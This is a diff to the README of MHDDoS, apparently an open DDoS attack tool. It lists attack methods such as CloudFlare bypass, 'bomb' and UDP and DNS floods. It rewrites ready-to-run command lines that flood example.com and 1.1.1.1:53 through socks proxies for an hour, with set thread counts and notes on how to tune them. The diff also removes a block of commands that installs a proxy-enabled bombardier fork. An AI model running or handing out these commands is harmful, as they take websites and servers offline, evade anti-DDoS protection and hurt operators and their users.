@@ -39,7 +39,7 @@
    * <img src="https://techcrunch.com/wp-content/uploads/2019/06/J2LlHqT3qJl0bG9Alpgc-1-730x438.png?w=730" width="16" height="16" alt="CloudFlare"> CFB | CloudFlare Bypass
    * <img src="https://techcrunch.com/wp-content/uploads/2019/06/J2LlHqT3qJl0bG9Alpgc-1-730x438.png?w=730" width="16" height="16" alt="CloudFlare UnderAttack Mode"> CFBUAM | CloudFlare Under Attack Mode Bypass
    * <img src="http://iclouddnsbypass.com/wp-content/uploads/2015/02/iCloudDNSBypassServer.ico" width="16" height="16" alt="bypass"> BYPASS |  Bypass Normal AntiDDoS
-   * <img src="https://cdn-icons-png.flaticon.com/512/905/905568.png" width="16" height="16" alt="bypass"> BOMB |  Bypass with codesenberg/bombardier
+   * <img src="https://cdn-icons-png.flaticon.com/512/905/905568.png" width="16" height="16" alt="bypass"> <a href="BOMBARDIER.md">BOMB</a> |  Bypass with [codesenberg/bombardier
 
 
 * 🧨 Layer4: 
@@ -97,19 +97,7 @@ You can download it from [GitHub Releases](https://github.com/MHProDev/MHDDoS/re
 * [yarl](https://github.com/aio-libs/yarl)
 ---
 Optional
-* [bombardier with proxy](github.com/mariotrucco/bombardier@78-add-proxy-support)
-
-**Bombardier with proxy installation**
-
-```shell script
-mkdir bombardier_tmp
-cd bombardier_tmp
-go mod init bombardier_tmp
-go mod edit -replace github.com/codesenberg/bombardier=github.com/mariotrucco/bombardier@78-add-proxy-support
-go get github.com/codesenberg/bombardier
-cd ..
-rm -r bombardier_tmp
-```
+* [bombardier with proxy](BOMBARDIER.md)
 
 **Videos**
 
@@ -124,10 +112,10 @@ rm -r bombardier_tmp
 
 **Clone and Install Script**
 
-```console
+```shell script
 git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
-pip3 install -r requirements.txt
+pip install -r requirements.txt
 ```
 
 
@@ -141,27 +129,33 @@ pip3 install -r requirements.txt
 | SOCKS5            | 5 |
 
 * Layer7 (Website):
-```console
-python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100
-python3 start.py bomb https://example.com 5 50 socks5.txt 100 100
+```shell script
+# Running bypass attack from 101 threads, 
+# with socks 5, 100 requests per proxy (connection), for 3600 seconds  
+python start.py bypass https://example.com 5 101 socks5.txt 100 3600
+# Running bomb attack from 50 threads (be careful must be < 300)
+# with all proxies (0), 100 requests per proxy (connection), for 3600 seconds
+python start.py bomb https://example.com 0 50 proxy.txt 100 3600
 ```
 
 * Layer4 (Server/Home):
-```console
-python3 start.py udp 1.1.1.1:53 1 100 socks5.txt 5
-python3 start.py dns 1.1.1.1:53 1 100 socks5.txt 5 dns.txt
+```shell script
+# Running udp attack from 100 threads, 
+# with socks 5, 100 requests per proxy (connection), for 3600 seconds  
+python start.py udp 1.1.1.1:53 100 3600 socks5.txt 5
+python start.py dns 1.1.1.1:53 100 3600 socks5.txt 5 dns.txt
 ```
 
 * Debug Mode (L4/L7):
-```console
-python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100 true
-python3 start.py udp 1.1.1.1:53 1 100 socks5.txt 5
+```shell script
+python start.py bypass https://example.com 5 101 socks5.txt 100 3600 true
+python start.py udp 1.1.1.1:53 100 3600 socks5.txt 5
 ```
 
 * Tools/Help:
-```console
-python3 start.py tools
-python3 start.py help
+```shell script
+python start.py tools
+python start.py help
 ```
 
 [python3]: https://python.org 'Python3'
